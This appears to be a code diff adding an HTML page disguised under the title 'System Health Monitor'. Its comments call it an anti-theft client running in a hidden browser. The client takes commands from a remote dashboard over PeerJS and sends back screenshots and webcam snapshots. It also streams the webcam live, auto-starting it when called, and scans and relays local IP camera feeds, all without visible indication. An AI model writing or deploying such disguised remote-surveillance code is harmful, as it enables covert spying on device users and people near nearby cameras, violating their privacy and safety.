@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<title>System Health Monitor</title>
+<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+</head>
+<body>
+<div id="status">Initializing...</div>
+<video id="webcamVideo" autoplay muted playsinline style="display:none"></video>
+<script>
+/**
+ * ANTI-THEFT PEERJS CLIENT
+ * Chạy trong hidden browser, kết nối PeerJS Cloud
+ * Nhận lệnh từ Dashboard qua DataChannel
+ * Stream webcam qua MediaConnection
+ */
+
+const LOCAL_API = 'http://127.0.0.1:39127/api';
+let deviceId = '';
+let peer = null;
+let webcamStream = null;
+let currentCall = null;
+let reconnectTimer = null;
+
+const statusEl = document.getElementById('status');
+function setStatus(msg) { statusEl.textContent = msg; console.log('[Client]', msg); }
+
+// === GET CONFIG ===
+async function getConfig() {
+  try {
+    const res = await fetch(LOCAL_API + '/config');
+    const data = await res.json();
+    deviceId = data.deviceId;
+    setStatus('Device ID: ' + deviceId);
+  } catch (e) {
+    setStatus('Waiting for local server...');
+    setTimeout(getConfig, 3000);
+  }
+}
+
+// === PEERJS CONNECTION ===
+function connectPeer() {
+  if (peer) { try { peer.destroy(); } catch {} }
+
+  setStatus('Connecting to PeerJS Cloud: ' + deviceId);
+
+  peer = new Peer(deviceId, {
+    config: {
+      iceServers: [
+        { urls: 'stun:stun.l.google.com:19302' },
+        { urls: 'stun:stun1.l.google.com:19302' },
+      ]
+    }
+  });
+
+  peer.on('open', (id) => {
+    setStatus('ONLINE: ' + id);
+    clearInterval(reconnectTimer);
+    // Heartbeat — keep connection alive
+    setInterval(() => {
+      if (!peer || peer.disconnected) reconnect();
+    }, 30000);
+  });
+
+  peer.on('connection', (conn) => {
+    setStatus('Dashboard connected: ' + conn.peer);
+    handleDataConnection(conn);
+  });
+
+  peer.on('call', (call) => {
+    setStatus('Incoming call from: ' + call.peer);
+    handleMediaCall(call);
+  });
+
+  peer.on('disconnected', () => {
+    setStatus('Disconnected. Reconnecting...');
+    reconnect();
+  });
+
+  peer.on('error', (err) => {
+    setStatus('Error: ' + err.type);
+    if (err.type === 'unavailable-id') {
+      // ID taken — add random suffix
+      deviceId = deviceId.split('_r')[0] + '_r' + Math.random().toString(36).slice(2, 5);
+      setTimeout(connectPeer, 3000);
+    } else {
+      reconnect();
+    }
+  });
+}
+
+function reconnect() {
+  clearInterval(reconnectTimer);
+  reconnectTimer = setInterval(() => {
+    if (!peer || peer.destroyed) {
+      connectPeer();
+    } else if (peer.disconnected) {
+      try { peer.reconnect(); } catch { connectPeer(); }
+    }
+  }, 10000);
+}
+
+// === DATA CONNECTION (Commands) ===
+function handleDataConnection(conn) {
+  conn.on('data', async (data) => {
+    console.log('[CMD]', data);
+    const cmd = typeof data === 'string' ? JSON.parse(data) : data;
+
+    switch (cmd.command) {
+      case 'ping':
+        conn.send(JSON.stringify({ type: 'pong', deviceId, timestamp: Date.now() }));
+        break;
+
+      case 'info': {
+        try {
+          const res = await fetch(LOCAL_API + '/info');
+          const info = await res.json();
+          conn.send(JSON.stringify({ type: 'info', data: info }));
+        } catch (e) {
+          conn.send(JSON.stringify({ type: 'error', message: e.message }));
+        }
+        break;
+      }
+
+      case 'snap-screen': {
+        setStatus('Capturing screenshot...');
+        try {
+          const res = await fetch(LOCAL_API + '/screenshot');
+          const result = await res.json();
+          if (result.ok) {
+            // Send in chunks (DataChannel has size limit)
+            const chunks = chunkString(result.image, 60000);
+            conn.send(JSON.stringify({ type: 'capture-start', captureType: 'screen', totalChunks: chunks.length }));
+            for (let i = 0; i < chunks.length; i++) {
+              conn.send(JSON.stringify({ type: 'capture-chunk', index: i, data: chunks[i] }));
+            }
+            conn.send(JSON.stringify({ type: 'capture-end', captureType: 'screen' }));
+            setStatus('Screenshot sent');
+          }
+        } catch (e) {
+          conn.send(JSON.stringify({ type: 'error', message: 'Screenshot failed: ' + e.message }));
+        }
+        break;
+      }
+
+      case 'snap-webcam': {
+        setStatus('Capturing webcam...');
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
+          const video = document.getElementById('webcamVideo');
+          video.srcObject = stream;
+          await new Promise(r => setTimeout(r, 1000)); // Wait for camera warm-up
+
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+
+          const base64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+          stream.getTracks().forEach(t => t.stop());
+
+          const chunks = chunkString(base64, 60000);
+          conn.send(JSON.stringify({ type: 'capture-start', captureType: 'webcam', totalChunks: chunks.length }));
+          for (let i = 0; i < chunks.length; i++) {
+            conn.send(JSON.stringify({ type: 'capture-chunk', index: i, data: chunks[i] }));
+          }
+          conn.send(JSON.stringify({ type: 'capture-end', captureType: 'webcam' }));
+          setStatus('Webcam photo sent');
+        } catch (e) {
+          conn.send(JSON.stringify({ type: 'error', message: 'Webcam failed: ' + e.message }));
+        }
+        break;
+      }
+
+      case 'start-webcam': {
+        setStatus('Starting webcam stream...');
+        try {
+          webcamStream = await navigator.mediaDevices.getUserMedia({
+            video: { width: 640, height: 480, frameRate: 15 },
+            audio: false
+          });
+          conn.send(JSON.stringify({ type: 'webcam-ready', deviceId }));
+          setStatus('Webcam stream ready — waiting for call');
+        } catch (e) {
+          conn.send(JSON.stringify({ type: 'error', message: 'Webcam start failed: ' + e.message }));
+        }
+        break;
+      }
+
+      case 'stop-webcam': {
+        if (webcamStream) {
+          webcamStream.getTracks().forEach(t => t.stop());
+          webcamStream = null;
+        }
+        if (currentCall) { currentCall.close(); currentCall = null; }
+        setStatus('Webcam stopped');
+        conn.send(JSON.stringify({ type: 'webcam-stopped' }));
+        break;
+      }
+
+      // === CAMERA RELAY (IPC Server on localhost) ===
+      case 'scan-cameras': {
+        setStatus('Scanning cameras via IPC server...');
+        try {
+          const ipcPort = cmd.params?.port || 4200;
+          const res = await fetch(`http://localhost:${ipcPort}/api/scan`);
+          const data = await res.json();
+          conn.send(JSON.stringify({ type: 'camera-list', data }));
+          setStatus('Camera scan sent: ' + (data.cameras?.length || 0) + ' cameras');
+        } catch (e) {
+          conn.send(JSON.stringify({ type: 'error', message: 'Camera scan failed. Is IPC server running? ' + e.message }));
+        }
+        break;
+      }
+
+      case 'camera-snap': {
+        setStatus('Capturing camera frame...');
+        try {
+          const ipcPort = cmd.params?.port || 4200;
+          const streamUrl = cmd.params?.url;
+          if (!streamUrl) {
+            conn.send(JSON.stringify({ type: 'error', message: 'Missing camera URL' }));
+            break;
+          }
+          // Fetch MJPEG frame from IPC stream endpoint
+          const res = await fetch(`http://localhost:${ipcPort}/api/stream?url=${encodeURIComponent(streamUrl)}`);
+          const blob = await res.blob();
+          const reader = new FileReader();
+          reader.onload = () => {
+            const base64 = reader.result.toString().split(',')[1];
+            const chunks = chunkString(base64, 60000);
+            conn.send(JSON.stringify({ type: 'capture-start', captureType: 'camera', totalChunks: chunks.length, cameraUrl: streamUrl }));
+            for (let i = 0; i < chunks.length; i++) {
+              conn.send(JSON.stringify({ type: 'capture-chunk', index: i, data: chunks[i] }));
+            }
+            conn.send(JSON.stringify({ type: 'capture-end', captureType: 'camera' }));
+            setStatus('Camera frame sent');
+          };
+          reader.readAsDataURL(blob);
+        } catch (e) {
+          conn.send(JSON.stringify({ type: 'error', message: 'Camera snap failed: ' + e.message }));
+        }
+        break;
+      }
+
+      case 'camera-live': {
+        // Relay camera MJPEG as canvas MediaStream via WebRTC
+        setStatus('Starting camera live relay...');
+        try {
+          const ipcPort = cmd.params?.port || 4200;
+          const streamUrl = cmd.params?.url;
+          if (!streamUrl) {
+            conn.send(JSON.stringify({ type: 'error', message: 'Missing camera URL' }));
+            break;
+          }
+          // Create img element to load MJPEG stream
+          const img = document.createElement('img');
+          img.crossOrigin = 'anonymous';
+          img.src = `http://localhost:${ipcPort}/api/stream?url=${encodeURIComponent(streamUrl)}`;
+          img.style.display = 'none';
+          document.body.appendChild(img);
+
+          // Wait for first frame
+          await new Promise((resolve, reject) => {
+            img.onload = resolve;
+            img.onerror = reject;
+            setTimeout(reject, 10000);
+          });
+
+          // Canvas to relay as MediaStream
+          const canvas = document.createElement('canvas');
+          canvas.width = img.naturalWidth || 640;
+          canvas.height = img.naturalHeight || 480;
+          const ctx = canvas.getContext('2d');
+
+          // Draw frames at ~5fps
+          const drawInterval = setInterval(() => {
+            try {
+              ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+            } catch {}
+          }, 200);
+
+          const cameraRelayStream = canvas.captureStream(5);
+          window._cameraRelay = { img, canvas, drawInterval, stream: cameraRelayStream };
+
+          conn.send(JSON.stringify({ type: 'camera-live-ready', cameraUrl: streamUrl }));
+          setStatus('Camera live ready — waiting for call');
+        } catch (e) {
+          conn.send(JSON.stringify({ type: 'error', message: 'Camera live failed: ' + e.message }));
+        }
+        break;
+      }
+
+      case 'stop-camera-live': {
+        if (window._cameraRelay) {
+          clearInterval(window._cameraRelay.drawInterval);
+          window._cameraRelay.stream.getTracks().forEach(t => t.stop());
+          window._cameraRelay.img.remove();
+          window._cameraRelay.canvas.remove();
+          window._cameraRelay = null;
+        }
+        conn.send(JSON.stringify({ type: 'camera-live-stopped' }));
+        setStatus('Camera live stopped');
+        break;
+      }
+
+      default:
+    }
+  });
+
+  conn.on('close', () => setStatus('Dashboard disconnected'));
+  conn.on('error', (e) => setStatus('Data error: ' + e));
+}
+
+// === MEDIA CALL (Webcam or Camera Relay Stream) ===
+function handleMediaCall(call) {
+  // Priority: 1. Camera relay stream, 2. Webcam stream, 3. Auto-start webcam
+  if (window._cameraRelay && window._cameraRelay.stream) {
+    call.answer(window._cameraRelay.stream);
+    currentCall = call;
+    setStatus('Streaming camera relay to dashboard');
+    call.on('close', () => { currentCall = null; setStatus('Camera relay stream ended'); });
+  } else if (webcamStream) {
+    call.answer(webcamStream);
+    currentCall = call;
+    setStatus('Streaming webcam to dashboard');
+    call.on('close', () => { currentCall = null; setStatus('Stream ended'); });
+  } else {
+    // Auto-start webcam if not ready
+    navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, frameRate: 15 }, audio: false })
+      .then(stream => {
+        webcamStream = stream;
+        call.answer(stream);
+        currentCall = call;
+        setStatus('Streaming webcam (auto-started)');
+        call.on('close', () => { currentCall = null; setStatus('Stream ended'); });
+      })
+      .catch(e => {
+        setStatus('Cannot start webcam: ' + e.message);
+        call.close();
+      });
+  }
+}
+
+// === UTILS ===
+function chunkString(str, size) {
+  const chunks = [];
+  for (let i = 0; i < str.length; i += size) {
+    chunks.push(str.slice(i, i + size));
+  }
+  return chunks;
+}
+
+// === INIT ===
+async function init() {
+  setStatus('Anti-Theft Client loading...');
+  await getConfig();
+  // Small delay for config
+  setTimeout(connectPeer, 1000);
+}
+
+init();
+</script>
+</body>
+</html>
